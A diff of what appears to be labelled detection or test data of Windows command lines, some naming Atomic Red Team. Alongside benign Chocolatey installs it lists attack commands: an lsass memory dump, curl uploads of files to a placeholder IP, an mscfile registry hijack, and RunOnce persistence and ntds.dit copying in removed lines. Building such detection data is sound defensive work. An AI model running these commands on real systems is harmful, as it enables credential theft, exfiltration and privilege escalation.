@@ -1,6 +1,16 @@
-1	nltest /domain_trusts
-1	nltest /dclist
-1	whoami /all
-0	copy ${shadow_copy_path}\windows\ntds\ntds.dit ${local_file_path}
-0	cmd.exe /c "net.exe stop ${service_name}"
-0	Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"  -Name "Atomic Red Team" -Value "${command_to_execute}"
+1	cmd /c "choco install winscp"
+1	powershell -c "choco install winscp"
+1	choco install -y winscp
+1	cmd /c "choco install -y winscp"
+1	powershell -c "choco install -y winscp"
+1	choco install -f winscp
+1	cmd /c "choco install -f winscp"
+1	powershell -c "choco install -f winscp"
+0	cmd /c "procdump -mm lsass lsassdump.dmp"
+0	cmd /c "curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+0	cmd /c "7z.exe a ${destination_file_path} ${source_file_path} -p${password}"
+0	cmd /c "mstsc /v:${ip_address} /remoteGuard"
+0	cmd /c "curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+0	cmd /c "certutil -encode -gmt -v -f error.txt encode.txt"
+0	cmd /c "del ${local_file_path}"
